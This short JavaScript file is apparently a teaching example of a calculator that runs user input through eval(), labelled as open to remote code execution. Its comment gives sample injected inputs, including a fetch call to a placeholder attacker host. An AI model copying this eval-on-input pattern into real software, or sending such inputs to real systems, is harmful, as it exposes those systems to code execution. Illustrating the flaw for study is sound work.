// A simple calculator that is dangerously vulnerable to Remote Code Execution (RCE)
function calculate(expression) {
    // VULNERABILITY: The eval() function executes string input as code .
    // A user could pass "process.exit()" or "fetch('https://attacker.com')" 
    // instead of "2 + 2".
    try {
        const result = eval(expression); 
        return `Result: ${result}`;
    } catch (err) {
        return "Invalid expression";
    }
}

// Example usage:
const userInput = "2 + 2"; // In a real app, this comes from a request
console.log(calculate(userInput));